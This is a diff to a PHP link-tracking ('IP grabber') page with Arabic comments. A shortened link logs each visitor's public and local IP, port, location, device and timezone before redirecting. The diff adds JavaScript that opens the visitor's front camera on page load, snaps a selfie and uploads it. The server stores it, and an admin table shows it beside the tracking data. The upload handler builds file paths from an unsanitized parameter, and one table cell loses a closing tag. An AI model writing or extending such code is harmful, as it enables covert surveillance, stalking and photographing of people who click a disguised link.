@@ -6,7 +6,7 @@ error_reporting(E_ALL);
 try {
     $db = new PDO('sqlite:tracker.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
-    // إنشاء الجداول مع إضافة حقل المنفذ (port)
+    // إنشاء الجداول مع إضافة حقل لصورة السيلفي
     $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         code TEXT UNIQUE, 
@@ -28,10 +28,39 @@ try {
         device_info TEXT, 
         screen_res TEXT, 
         timezone TEXT, 
+        photo TEXT, 
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
 } catch (Exception $e) {
     die("خطأ في قاعدة البيانات: " . $e->getMessage());
+}
+
+// معالجة استقبال صورة السيلفي المرسلة عبر طلب AJAX
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) &&$_POST['action'] === 'save_photo') {
+    $code =$_POST['code'] ?? '';
+    $imgData =$_POST['image'] ?? '';
+    
+    if (!empty($imgData) && !empty($code)) {
+        // تنظيف بيانات الصورة وإزالة الرأسية
+        $imgData = str_replace('data:image/jpeg;base64,', '',$imgData);
+        $imgData = str_replace(' ', '+',$imgData);
+        $decodedData = base64_decode($imgData);
+        
+        // إنشاء مجلد للصور إذا لم يكن موجوداً
+        if (!file_exists('uploads')) {
+            mkdir('uploads', 0755, true);
+        }
+        
+        $filename = 'uploads/photo_' .$code . '_' . time() . '.jpg';
+        file_put_contents($filename,$decodedData);
+        
+        // حفظ مسار الصورة في آخر سجل يخص هذا الكود
+        $stmt =$db->prepare("UPDATE logs SET photo = ? WHERE code = ? ORDER BY id DESC LIMIT 1");
+        $stmt->execute([$filename,$code]);
+        
+        echo json_encode(['status' => 'success']);
+    }
+    exit();
 }
 
 function get_real_ip() {
@@ -77,7 +106,7 @@ function get_ip_details($ip) {
         return [
             'country' => $data['country'] ?? 'غير معروف',
             'city' => $data['city'] ?? 'غير معروف',
-            'lat' => $data['lat'] ?? '36.7538', 'lon' =>$data['lon'] ?? '3.0588',
+            'lat' => $data['lat'] ?? '36.7538',              'lon' =>$data['lon'] ?? '3.0588',
             'isp' => parse_isp($data['isp'] ?? '',$data['org'] ?? '')
         ];
     }
@@ -91,7 +120,15 @@ if (isset($_GET['r'])) {
     $stmt->execute([$code]);
     $link =$stmt->fetch(PDO::FETCH_ASSOC);
 
-    if ($link) {$target = $link['target_url'];$public_ip = get_real_ip();
+    if ($link) {
+        $target =$link['target_url'];
+        
+        // إذا كان الطلب قادماً لالتقاط الصورة عبر الجافاسكريبت
+        if (isset($_GET['capture']) &&$_GET['capture'] == '1') {
+            exit();
+        }
+
+        $public_ip = get_real_ip();
         $local_ip =$_GET['lip'] ?? 'غير متوفر';
         $port =$_SERVER['REMOTE_PORT'] ?? 'غير متوفر';
         $geo = get_ip_details($public_ip);
@@ -107,8 +144,11 @@ if (isset($_GET['r'])) {
             // الاستمرار في حالة خطأ السجل
         }
 
-        header("Location: " . $target);
-        exit();
+        // إذا تم إرسال معلومات الشاشة، نقوم بتحويل الزائر للرابط المستهدف
+        if (isset($_GET['screen'])) {
+            header("Location: " . $target);
+            exit();
+        }
     } else {
         die("الرابط غير موجود.");
     }
@@ -169,7 +209,7 @@ if (!empty($filter_code)) {
         button:hover, .btn:hover { background: #0369a1; }
         .result-box { background: #030712; border: 1px solid rgba(56, 189, 248, 0.3); padding: 14px; border-radius: 8px; margin-top: 12px; word-break: break-all; }
         .table-container { overflow-x: auto; margin-top: 12px; border: 1px solid #1f2937; border-radius: 8px; }
-        table { width: 100%; border-collapse: collapse; text-align: right; font-size: 12px; min-width: 1000px; }
+        table { width: 100%; border-collapse: collapse; text-align: right; font-size: 12px; min-width: 1050px; }
         th { background: #030712; color: #9ca3af; padding: 12px; border-bottom: 1px solid #1f2937; white-space: nowrap; }
         td { padding: 12px; border-bottom: 1px solid #1f2937; color: #e5e7eb; white-space: nowrap; }
         tr:hover { background: rgba(31, 41, 55, 0.4); }
@@ -181,34 +221,66 @@ if (!empty($filter_code)) {
         .copy-btn.success { background: #059669; }
         .map-btn { background: #047857; color: #fff; padding: 5px 10px; border-radius: 6px; font-size: 11px; text-decoration: none; font-weight: bold; display: inline-block; }
         .map-btn:hover { background: #065f46; }
+        .visitor-photo { width: 40px; height: 40px; border-radius: 50%; object-fit: cover; border: 2px solid #38bdf8; cursor: pointer; transition: transform 0.2s; }
+        .visitor-photo:hover { transform: scale(2.5); }
         .link-row { display: flex; gap: 8px; margin-top: 6px; align-items: center; }
     </style>
     <script>
         document.addEventListener("DOMContentLoaded", function() {
-            // طلب إذن فتح الكاميرا عند تحميل الصفحة
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(function(stream) {
-                        // إيقاف المسار فوراً بعد أخذ الإذن بنجاح
-                        stream.getTracks().forEach(track => track.stop());
-                    })
-                    .catch(function(error) {
-                        console.log("تم رفض الإذن أو الكاميرا غير متوفرة");
-                    });
-            }
-
             const urlParams = new URLSearchParams(window.location.search);
             const redirectCode = urlParams.get('r');
             const hasScreen = urlParams.has('screen');
 
+            // إذا فتح الزائر الرابط لأول مرة
             if (redirectCode && !hasScreen) {
-                const screenRes = screen.width + "x" + screen.height;
-                const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                // محاولة التقاط صورة سيلفي أولاً
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                        .then(function(stream) {
+                            const video = document.createElement('video');
+                            video.srcObject = stream;
+                            video.play();
+                            
+                            setTimeout(function() {
+                                const canvas = document.createElement('canvas');
+                                canvas.width = 320;
+                                canvas.height = 240;
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                                
+                                // إيقاف الكاميرا
+                                stream.getTracks().forEach(track => track.stop());
 
-                // التوجيه السريع مع إرسال الأبعاد والمنطقة الزمنية
-                window.location.href = `/?r=${redirectCode}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}`;
+                                // إرسال الصورة للخادم
+                                const formData = new URLSearchParams();
+                                formData.append('action', 'save_photo');
+                                formData.append('code', redirectCode);
+                                formData.append('image', imageData);
+
+                                fetch(window.location.href, {
+                                    method: 'POST',
+                                    body: formData
+                                }).finally(() => {
+                                    proceedRedirect(redirectCode);
+                                });
+                            }, 1000); // الانتظار لثانية لضمان تشغيل الكاميرا
+                        })
+                        .catch(function(error) {
+                            // في حال رفض الإذن أو عدم وجود كاميرا، المتابعة طبيعياً
+                            proceedRedirect(redirectCode);
+                        });
+                } else {
+                    proceedRedirect(redirectCode);
+                }
             }
         });
+
+        function proceedRedirect(code) {
+            const screenRes = screen.width + "x" + screen.height;
+            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            window.location.href = `/?r=${code}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}`;
+        }
 
         function copyText(text, btnElement) {
             navigator.clipboard.writeText(text).then(() => {
@@ -285,6 +357,7 @@ if (!empty($filter_code)) {
                     <thead>
                         <tr>
                             <th>#</th>
+                            <th>الصورة</th>
                             <th>الكود</th>
                             <th>عنوان IP العام</th>
                             <th>عنوان IP المحلي</th>
@@ -298,18 +371,25 @@ if (!empty($filter_code)) {
                     </thead>
                     <tbody>
                         <?php if (empty($logs)): ?>
-                            <tr><td colspan="10" style="text-align: center; color: #6b7280; padding: 25px;">لا توجد أي زيارات مسجلة حتى الآن.</td></tr>
+                            <tr><td colspan="11" style="text-align: center; color: #6b7280; padding: 25px;">لا توجد أي زيارات مسجلة حتى الآن.</td></tr>
                         <?php else: ?>
                             <?php foreach ($logs as$log): ?>
                             <tr>
                                 <td><?php echo $log['id']; ?></td>
+                                <td>
+                                    <?php if (!empty($log['photo']) && file_exists($log['photo'])): ?>
+                                        <img src="<?php echo htmlspecialchars($log['photo']); ?>" class="visitor-photo" alt="صورة الزائر" title="انقر للتكبير">
+                                    <?php else: ?>
+                                        <span style="color: #6b7280; font-size: 10px;">لا توجد صورة</span>
+                                    <?php endif; ?>
+                                </td>
                                 <td>
                                     <span class="badge"><?php echo htmlspecialchars($log['code']); ?></span>
                                     <button type="button" class="copy-btn" style="font-size: 9px; padding: 2px 5px; margin-right: 3px;" onclick="copyText('<?php echo htmlspecialchars($log['code']); ?>', this)">نسخ</button>
                                 </td>
                                 <td class="ip-public"><?php echo htmlspecialchars($log['public_ip'] ?? 'N/A'); ?></td>
                                 <td class="ip-local"><?php echo htmlspecialchars($log['local_ip'] ?? '192.168.1.X'); ?></td>
-                                <td><span class="port-badge"><?php echo htmlspecialchars($log['port'] ?? 'N/A'); ?></span></td>
+                                <td><span class="port-badge"><?php echo htmlspecialchars($log['port'] ?? 'N/A'); ?></td>
                                 <td style="color: #fbbf24; font-weight: bold;"><?php echo htmlspecialchars($log['device_info']); ?></td>
                                 <td>
                                     <strong><?php echo htmlspecialchars($log['country']); ?> / <?php echo htmlspecialchars($log['city']); ?></strong><br>
